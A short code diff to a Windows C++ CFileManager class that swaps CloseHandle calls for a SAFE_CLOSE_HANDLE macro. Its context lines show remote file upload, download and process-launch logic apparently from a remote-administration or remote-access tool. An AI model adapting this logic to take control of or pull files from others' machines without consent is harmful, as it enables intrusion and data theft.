@@ -213,8 +213,8 @@ bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
         si.lpDesktop = "WinSta0\\Default";
 
     CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    SAFE_CLOSE_HANDLE(pi.hProcess);
+    SAFE_CLOSE_HANDLE(pi.hThread);
     return true;
 }
 
@@ -395,7 +395,7 @@ UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
     if (hFile == INVALID_HANDLE_VALUE)
         return FALSE;
     dwSizeLow =	GetFileSize(hFile, &dwSizeHigh);
-    CloseHandle(hFile);
+    SAFE_CLOSE_HANDLE(hFile);
     // 构造数据包，发送文件长度
     int		nPacketSize = lstrlen(lpszFileName) + 10;
     BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
@@ -447,7 +447,7 @@ UINT CFileManager::SendFileData(LPBYTE lpBuffer)
     lpPacket[0] = TOKEN_FILE_DATA;
     memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
     ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
-    CloseHandle(hFile);
+    SAFE_CLOSE_HANDLE(hFile);
 
     if (nNumberOfBytesRead > 0) {
         int	nPacketSize = nNumberOfBytesRead + nHeadLength;
@@ -644,7 +644,7 @@ void CFileManager::GetFileData()
         m_nCurrentProcessFileLength = 0;
         return;
     }
-    CloseHandle(hFile);
+    SAFE_CLOSE_HANDLE(hFile);
 
     Send(bToken, sizeof(bToken));
 }
@@ -692,7 +692,7 @@ void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
                &dwBytesWrite,
                NULL
            );
-    CloseHandle(hFile);
+    SAFE_CLOSE_HANDLE(hFile);
     // 为了比较，计数器递增
     BYTE	bToken[9];
     bToken[0] = TOKEN_DATA_CONTINUE;
